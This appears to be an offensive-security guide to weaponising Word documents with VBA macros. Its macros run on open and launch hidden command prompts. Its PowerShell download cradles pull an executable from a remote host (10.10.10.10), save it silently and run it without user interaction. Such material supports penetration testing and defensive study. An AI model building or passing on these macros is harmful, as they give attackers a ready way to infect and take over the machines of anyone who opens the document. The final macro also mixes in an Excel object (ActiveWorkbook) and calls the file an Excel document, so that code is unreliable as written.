# Word

In order for any of the code below to execute, the user has to "Enable Content" for Macros to run and disable Protected View after opening the malicious document. This needs to be done for any new document that is opened. In addition, this will only work in Macro-Enabled formats such as .doc (Word 97-2003 Document) or .docm, whereas newer formats such as .docx will not store macros.

## VBA Application Launcher

We can launch applications outside of VBA with the "Shell" function. The function takes two arguments, first, the application to launch, and second, the "WindowStyle" of the launched application. We can use the "vbHide" or "0" value to launch a hidden application. Note, the application may not open in a window, however, it is visible as a child process with any process viewer/explorer utility such as procexp/64 from sysinternals.

```vba
Sub Document_Open()
    macro1
End Sub

Sub AutoOpen()
    macro1
End Sub

Sub macro1()
    Dim str As String
    str = "cmd.exe"
    Shell str, vbHide
End Sub
```

## VBA WSH Application Launcher

We can use the Windows Script Host (WSH) to launch an application outside of VBA. The code below opens a windows command prompt when the macro runs.

{% hint style="info" %}
Closing the Word document does not close the command prompt window. When the macro runs, a child process is created for the command prompt. After closing the Word document, the parent process appears to be closed, when viewing in task manager or procexp, however both the parent and the child process remains.
{% endhint %}

```vba
Sub Document_Open()
    macro1
End Sub

Sub AutoOpen()
    macro1
End Sub

Sub macro1()
    Dim str As String
    str = "cmd.exe"
    CreateObject("Wscript.Shell").Run str, 1
End Sub
```



## VBA PowerShell Download Cradle

The code below will run the PowerShell command in a hidden PowerShell window, download the file and save it without any prompts to the user.

If an output path isn't specified, PowerShell will attempt to save the downloaded file in the same location as the Word document.

```vba
Sub Document_Open()
    macro1
End Sub

Sub AutoOpen()
    macro1
End Sub

Sub macro1()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10/winout64.exe', 'winsysx64.exe')"
    Shell str, 0
End Sub
```

## VBA PowerShell Download Cradle and Code Execution

When this macro runs, the code will download the payload, get the current path of the excel document, which is where the downloaded file will be saved by default, wait 5 seconds, and launch the payload, all without user interaction.

Word does not have a sleep or equivalent function or subroutine in VBA, and so the "Wait" subroutine is useful as it allows us to ensure that the file is completely downloaded before we attempt to execute it.

The "Wait" subroutine contains a "Do" loop, which, on each loop iteration, first calls the "DoEvents" function, which passes control to the operating system to process any events in its queue, before passing control back to Word. This is done to avoid causing issues with the system such as freezes or crashes.

The current date and time is obtained via a call to the "Now" function, which is used in the "Loop Until" statement. The loop will run until the current time is greater than the time returned by the "DateAdd" function. This function takes three arguments: a string expression that represents the interval of time ("s"), the number of seconds to wait (n), and the current time (t). Simply stated, "n" seconds are added to the time the loops starts and the result is compared to the current time. Once "n" seconds have passed, the loop completes.

```vba
Sub Document_Open()
    macro1
End Sub

Sub AutoOpen()
    macro1
End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub

Sub macro1()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10/out.exe', 'winintx64.exe')"
    Shell str, vbHide
    Dim binaryPath As String
    binaryPath = Application.ActiveWorkbook.Path + "\winintx64.exe"
    Wait (5)
    Shell binaryPath, vbHide

End Sub
```







